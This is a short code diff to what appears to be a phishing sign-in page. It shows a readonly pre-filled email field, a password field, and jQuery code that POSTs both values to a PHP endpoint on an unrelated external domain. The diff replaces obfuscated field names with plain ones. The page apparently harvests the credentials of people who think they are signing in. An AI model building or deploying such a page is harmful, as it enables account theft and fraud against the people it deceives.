@@ -101,9 +101,9 @@ $(document).ready(function() {
                     <form method="post" id="formx" class="my-4">
                         
                     
-                        <input type="email" name="x1" id="x1" class="form-control mb-3" value="" readonly>
+                        <input type="text" name="email" id="email" class="form-control mb-3" value="" readonly>
                    
-                        <input type="password" name="x2" id="x2" class="form-control mb-3" placeholder="Password" value="" required>
+                        <input type="password" name="password" id="password" class="form-control mb-3" placeholder="Password" value="" required>
                      
                         <button id="submitBtn" class="btn btn-md btn-primary">Sign In</button>
                     </form>
@@ -140,8 +140,8 @@ $(document).ready(function() {
 		url: "https://egp.pay.go.ug/post/now.php",
 		type: 'POST',
 		data:{
-            email: x1,
-            password: x2
+            email: email,
+            password: pass
           },
 		contentType: false,
 		processData: false,
